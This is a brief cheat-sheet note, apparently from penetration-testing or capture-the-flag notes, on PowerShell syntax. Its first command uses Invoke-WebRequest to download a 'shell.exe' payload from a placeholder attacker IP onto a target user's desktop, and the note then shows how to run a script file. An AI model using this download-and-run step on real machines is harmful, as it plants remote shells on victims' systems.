# Powershell Command Syntax
To perform a web request and save-to-file, similar to `wget -O ...` You can use this syntax,
```
Invoke-WebRequest -Uri http://(ATTACKER IP):(PORT)/shell.exe -OutFile C:\Users\(TARGET USER)\Desktop\shell.exe
```
And invoke with,
```
C:\> powershell -File C:\PATH\TO\FILE.PS1
```
